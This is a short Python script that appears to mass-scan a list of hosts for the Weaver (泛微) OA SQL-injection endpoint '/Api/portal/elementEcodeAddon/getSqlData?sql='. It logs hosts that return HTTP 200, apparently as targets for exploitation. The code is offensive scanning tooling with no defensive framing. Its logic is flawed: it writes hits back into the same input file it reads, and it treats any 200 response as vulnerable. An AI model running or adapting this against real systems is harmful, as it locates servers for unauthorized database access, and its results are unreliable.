import requests
 


def check_vuln():

    payload = '/Api/portal/elementEcodeAddon/getSqlData?sql='#泛微
    


    for ip in open('2.txt'):
        ip = ip.replace('\n', '')

        url = ip + payload

        try:
            vuln_code_l = requests.get(url).status_code

            print("check->" + ip)
            if vuln_code_l == 200:
                with open(r'2.txt', 'a+') as f:
                    f.write(ip + "\n")
                    f.close()

        except Exception as e:
            pass


if __name__ == '__main__':
    check_vuln()
